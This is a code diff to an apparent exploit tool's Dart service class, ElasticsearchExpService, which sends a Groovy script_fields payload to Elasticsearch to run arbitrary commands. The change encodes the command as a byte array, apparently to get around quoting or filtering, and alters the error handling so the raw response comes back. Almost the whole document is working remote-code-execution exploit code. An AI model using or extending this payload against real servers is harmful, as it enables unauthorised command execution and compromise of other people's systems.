@@ -306,11 +306,13 @@ class ElasticsearchExpService {
           )
           .timeout(timeout);
 
+      final cmdBytes = RceEncoder.groovyByteArray(cmd);
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
           'result': {
-            'script': 'def cmd="$cmd"; def res=cmd.execute().text; res',
+            'script':
+                'def cmd=new String([$cmdBytes] as byte[]); def res=cmd.execute().text; res',
           },
         },
       });
@@ -329,10 +331,14 @@ class ElasticsearchExpService {
             return hits.first['fields']?['result']?.first?.toString() ??
                 res.body;
           }
-        } catch (_) {}
+        } catch (e) {
+          return res.body;
+        }
         return res.body;
       }
-    } catch (_) {}
+    } catch (e) {
+      return null;
+    }
     return null;
   }
 }
